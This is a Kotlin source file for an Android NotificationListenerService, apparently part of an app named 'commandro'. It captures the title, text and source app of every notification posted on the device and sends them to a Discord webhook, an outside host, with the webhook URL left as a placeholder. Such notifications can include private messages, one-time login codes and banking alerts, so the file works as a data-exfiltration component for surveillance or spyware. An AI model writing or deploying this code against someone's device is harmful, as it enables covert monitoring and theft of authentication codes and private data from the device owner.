package com.example.commandro

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class NotificationListener : NotificationListenerService() {

    private val discordWebhookUrl =
        "https://discord.com/api/webhooks/*****ADD_YOUR_WEBHOOK******************"

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn != null) {
            try {
                val notificationTitle = sbn.notification.extras.getString("android.title") ?: "No Title"
                val notificationText = sbn.notification.extras.getString("android.text") ?: "No Text"
                val appName = sbn.packageName

                // Get the notification timestamp
                val timestamp = sbn.postTime
                // Format the timestamp
                val formattedTime = SimpleDateFormat("hh:mm a - dd/MM/yyyy", Locale.getDefault()).format(Date(timestamp))

                // Log notification details for debugging
                Log.d("NotificationListener", "Notification Posted: Title: $notificationTitle, Text: $notificationText, App: $appName, Time: $formattedTime")

                // Send notification details to Discord
                sendToDiscord(notificationTitle, notificationText, appName, formattedTime)
            } catch (e: Exception) {
                Log.e("NotificationListener", "Error processing notification", e)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        Log.d("NotificationListener", "Notification Removed: ${sbn?.packageName}")
    }

    // Updated method signature to include formatted time
    private fun sendToDiscord(title: String?, text: String?, appName: String?, formattedTime: String?) {
        val client = OkHttpClient()
        val json = """
        {
            "content": "-------------------------------------------------------------------\nNotification from Android:\n**App**: $appName\n**Title**: $title\n**Text**: $text\n**At**: $formattedTime\n-------------------------------------------------------------------"
        }
        """.trimIndent()

        Log.d("NotificationListener", "Sending to Discord: $json") // Log JSON being sent

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val requestBody = RequestBody.create(mediaType, json)

        val request = Request.Builder()
            .url(discordWebhookUrl)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("NotificationListener", "Failed to send notification to Discord", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("NotificationListener", "Notification sent to Discord")
                } else {
                    Log.e("NotificationListener", "Failed to send notification: ${response.code}")
                }
            }
        })
    }
}
